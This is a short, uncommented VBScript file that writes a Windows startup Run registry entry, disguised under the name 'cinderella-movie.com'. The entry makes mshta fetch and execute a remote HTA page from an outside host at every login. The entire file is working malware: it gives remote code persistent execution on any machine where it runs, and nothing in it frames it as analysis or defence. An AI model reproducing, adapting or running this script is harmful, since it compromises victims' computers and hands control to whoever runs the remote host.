Option Explicit

Dim objWshShell
Set objWshShell = CreateObject("WScript.Shell")

Dim strRegKey

Dim strRegEntry1
Dim strRegValue1

strRegKey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"

strRegEntry1 = "cinderella-movie.com"
strRegValue1 = "mshta http://www.cyber-erorist.com/keikoku.php"

objWshShell.RegWrite strRegKey & strRegEntry1, strRegValue1,"REG_SZ"

Set objWshShell = Nothing